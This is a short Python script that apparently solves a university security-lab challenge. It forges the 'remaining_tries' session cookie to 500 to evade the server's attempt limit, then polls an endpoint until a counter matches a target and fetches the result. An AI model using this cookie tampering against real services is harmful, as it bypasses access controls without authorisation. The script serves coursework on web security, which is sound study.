#!/usr/bin/env python
import requests
from re import findall

HELLO = "http://mustard.stt.rnl.tecnico.ulisboa.pt:15003/hello"
MORE = "http://mustard.stt.rnl.tecnico.ulisboa.pt:15003/more"
FINISH = "http://mustard.stt.rnl.tecnico.ulisboa.pt:15003/finish"

session = requests.session()
trg, crr = findall(r"\d+", session.get(HELLO).content.decode("UTF-8"))[:2]
session.cookies.set('remaining_tries', '500')

while crr != trg:
    crr = findall(r"\d+", session.get(MORE).content.decode("UTF-8"))[-1]

print(session.get(FINISH).content.decode("UTF-8"))
session.close()
